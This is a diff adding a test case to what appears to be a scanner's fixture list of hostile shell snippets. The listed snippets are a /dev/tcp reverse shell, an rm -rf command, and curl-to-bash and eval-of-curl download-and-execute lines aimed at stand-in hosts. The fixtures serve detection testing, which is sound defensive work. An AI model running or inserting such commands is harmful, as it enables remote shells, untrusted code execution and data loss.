@@ -16,6 +16,7 @@ CASES = (
     ("reverse-shell-indicator", "#!/bin/sh\nexec 5<>/dev/tcp/127.0.0.1/4444\n"),
     ("destructive-command-indicator", "#!/bin/sh\nrm -rf /tmp/bioaegis-redteam-only\n"),
     ("multiline-download-evasion", "#!/bin/sh\ncurl https://example.invalid/a \\\n| bash\n"),
+    ("download-eval-evasion", "#!/bin/sh\neval \"$(curl https://example.invalid/a)\"\n"),
 )
 
 
